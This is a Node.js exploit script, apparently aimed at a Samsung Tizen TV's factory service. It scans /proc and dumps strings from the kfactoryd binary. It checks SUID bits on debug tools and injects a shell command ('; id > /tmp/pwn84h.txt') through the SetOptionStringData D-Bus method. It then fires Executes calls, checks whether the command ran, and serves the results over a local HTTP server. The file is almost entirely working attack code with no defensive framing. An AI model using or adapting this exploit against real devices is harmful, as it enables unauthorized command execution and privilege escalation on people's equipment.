'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8173;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe84h.txt';
var PWN = '/tmp/pwn84h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Find kfactoryd binary path via /proc scan
  'try {',
  '  var fpids = ["572","277","279","280"];',
  '  for (var fi = 0; fi < fpids.length; fi++) {',
  '    try {',
  '      var fcmd = fs.readFileSync("/proc/"+fpids[fi]+"/cmdline","utf8");',
  '      if (fcmd.length > 0) { r.factory_cmd = { pid: fpids[fi], cmd: fcmd.replace(/\\0/g," ").slice(0,100) }; break; }',
  '    } catch(e) {}',
  '  }',
  '  if (!r.factory_cmd) {',
  '    var pids = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '    for (var pi = 0; pi < pids.length; pi++) {',
  '      try {',
  '        var comm = fs.readFileSync("/proc/"+pids[pi]+"/comm","utf8").trim();',
  '        if (comm.indexOf("factory") > -1 || comm === "kfactoryd") {',
  '          r.factory_cmd = { pid: pids[pi], comm: comm, cmd: fs.readFileSync("/proc/"+pids[pi]+"/cmdline","utf8").replace(/\\0/g," ").slice(0,100) };',
  '          break;',
  '        }',
  '      } catch(e) {}',
  '    }',
  '  }',
  '} catch(e) { r.factory_cmd_err = e.message; }',

  // 2. Read kfactoryd binary strings
  'try {',
  '  var fb = fs.readFileSync("/usr/bin/kfactoryd");',
  '  r.kfac_size = fb.length;',
  '  var fstrs = [], frun = 0, fstart = 0;',
  '  for (var i = 0; i < fb.length; i++) {',
  '    var b = fb[i];',
  '    if (b >= 32 && b < 127) { if (frun === 0) fstart = i; frun++; }',
  '    else { if (frun >= 6) fstrs.push(fb.slice(fstart,fstart+frun).toString("ascii")); frun = 0; }',
  '  }',
  '  r.kfac_exec = fstrs.filter(function(s){ return s.indexOf("exec")>-1||s.indexOf("Exec")>-1||s.indexOf("shell")>-1||s.indexOf("system")>-1||s.indexOf("popen")>-1||s.indexOf("launch")>-1; }).slice(0,30);',
  '  r.kfac_paths = fstrs.filter(function(s){ return s.charAt(0)==="/"; }).slice(0,30);',
  '  r.kfac_all = fstrs.slice(0,80);',
  '} catch(e) { r.kfac_err = e.message; }',

  // 3. Check SUID on debug binaries
  'var debug_bins = ["/usr/bin/csf-debug-agent","/usr/bin/csf-debug-asf-app","/usr/bin/csf-debug-local-agent","/usr/bin/launch_debug","/usr/bin/vddebugmenu","/usr/bin/debugJP","/usr/bin/debugutil","/usr/bin/ci_debugutil","/usr/bin/csi-debug"];',
  'r.debug_suid = {};',
  'debug_bins.forEach(function(bin) {',
  '  try { var st=fs.statSync(bin); r.debug_suid[bin]={mode:st.mode.toString(8),uid:st.uid,suid:!!(st.mode&0x800)}; }',
  '  catch(e) { r.debug_suid[bin]=e.code; }',
  '});',

  // 4. SetOptionStringData with cmd injection then Executes
  'try {',
  '  var inject = "; id > ' + PWN + ' #";',
  '  var o_set = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0",inject,String(inject.length)],{timeout:5000});',
  '  r.set_inject = {status:o_set.status,out:(o_set.stdout||Buffer.from("")).toString().trim().slice(0,100),err:(o_set.stderr||Buffer.from("")).toString().trim().slice(0,80)};',
  '  var o_exec = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","0","0"],{timeout:5000});',
  '  r.exec_after_inject = {status:o_exec.status,out:(o_exec.stdout||Buffer.from("")).toString().trim().slice(0,200)};',
  '} catch(e) { r.inject_err = e.message.slice(0,80); }',

  // 5. Check pwn after injection attempt
  'try { r.pwn1 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  // 6. Executes sweep (key 0..25, cmd 0)
  'r.exec_sweep = {};',
  'for (var ek = 0; ek <= 25; ek++) {',
  '  try {',
  '    var o_e = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(ek),"0"],{timeout:3000});',
  '    var eout = (o_e.stdout||Buffer.from("")).toString().trim();',
  '    if (eout && eout.indexOf("(1,)") === -1) r.exec_sweep["k"+ek] = eout.slice(0,200);',
  '  } catch(e) {}',
  '}',

  // 7. GetOptionStringData check (did SetOptionStringData work?)
  'try {',
  '  var o_get = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","0"],{timeout:5000});',
  '  r.get_option = {status:o_get.status,out:(o_get.stdout||Buffer.from("")).toString().trim().slice(0,200),err:(o_get.stderr||Buffer.from("")).toString().trim().slice(0,80)};',
  '} catch(e) { r.get_option_err = e.message.slice(0,80); }',

  // 8. Debugshell PID 1011 identity
  'try {',
  '  var dcmd = fs.readFileSync("/proc/1011/cmdline","utf8");',
  '  var dst = fs.readFileSync("/proc/1011/status","utf8");',
  '  var duid = dst.match(/^Uid:\\t(\\d+)/m);',
  '  r.dbg_pid1011 = { cmd: dcmd.replace(/\\0/g," ").slice(0,100), uid: duid?duid[1]:"?" };',
  '} catch(e) { r.dbg_pid1011_err = e.message.slice(0,60); }',

  // 9. GetItem for key 0..5 (returns iiiiiyss struct)
  'r.factory_item = {};',
  'for (var gk = 0; gk <= 5; gk++) {',
  '  try {',
  '    var o_gi = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(gk)],{timeout:4000});',
  '    r.factory_item["k"+gk] = (o_gi.stdout||Buffer.from("")).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '}',

  // 10. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
